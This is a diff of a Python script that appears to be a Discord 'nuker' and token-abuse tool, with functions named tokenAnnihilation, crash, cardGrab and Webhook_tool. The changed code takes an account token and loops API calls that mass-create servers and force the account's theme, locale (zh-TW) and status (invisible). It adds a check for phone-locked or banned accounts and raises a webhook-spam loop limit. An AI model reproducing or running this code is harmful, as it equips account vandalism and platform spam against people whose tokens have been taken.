@@ -682,7 +682,7 @@ def crash(jsonHook, defaultMessage, nameHooks, icons, icon, statuses):
                         json=payload,
                     )
                     if req.status_code in statuses:
-                        if x <= 30:
+                        if x <= 60:
                             info3 = request.json()
                             request = post(
                                 f"https://discord.com/api/v8/channels/{info3['id']}/webhooks",
@@ -1470,7 +1470,7 @@ def cardGrab(cc_digits):
 # Annihilation----------------------------------------------+
 
 
-def tokenAnnihilation(icon, dMdefaultText, statusName):
+def tokenAnnihilation(icon, dMdefaultText):
     sessionName = "Annihilation"
     errorLog = open("errorlogs.txt", "a+")
     print(exitMenu)
@@ -1677,32 +1677,40 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     headers={"Authorization": token},
                     json=setting,
                 )
-                if req.status_code not in statuses:
-                    # errorLog.write(
-                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
-                    # )
-                    print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
-                req = post(
-                    "https://discord.com/api/v8/guilds",
-                    headers={"Authorization": token},
-                    json=payload,
-                )
-                if req.status_code not in statuses:
-                    # errorLog.write(
-                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
-                    # )
-                    print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
-                req = patch(
-                    "https://discord.com/api/v8/users/@me/settings",
-                    headers={"Authorization": token},
-                    json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
-                )
-                if req.status_code not in statuses:
-                    # errorLog.write(
-                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
-                    # )
-                    print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
-                d = d + 1
+                try:
+                    if not req.json()["code"] == 40002:
+                        if req.status_code not in statuses:
+                            # errorLog.write(
+                            #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
+                            # )
+                            print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
+                        req = post(
+                            "https://discord.com/api/v8/guilds",
+                            headers={"Authorization": token},
+                            json=payload,
+                        )
+                        if req.status_code not in statuses:
+                            # errorLog.write(
+                            #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
+                            # )
+                            print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
+                        req = patch(
+                            "https://discord.com/api/v8/users/@me/settings",
+                            headers={"Authorization": token},
+                            json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
+                        )
+                        if req.status_code not in statuses:
+                            # errorLog.write(
+                            #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
+                            # )
+                            print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
+                        d = d + 1
+                    else:
+                        print(f"ERROR. This account has phone lock or banned :( . Details: {req.json()['message']}")
+                        input("\nPress key to continue.")
+                        break
+                except:
+                    continue
             print("\nStarted gliched.")
             while True:
                 req = patch(
@@ -1979,7 +1987,7 @@ while True:
         if select == "1":
             grabInfo()
         elif select == "2":
-            tokenAnnihilation(icon, dMdefaultText, statusName)
+            tokenAnnihilation(icon, dMdefaultText)
         elif select == "3":
             Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses)
         elif select == "4":
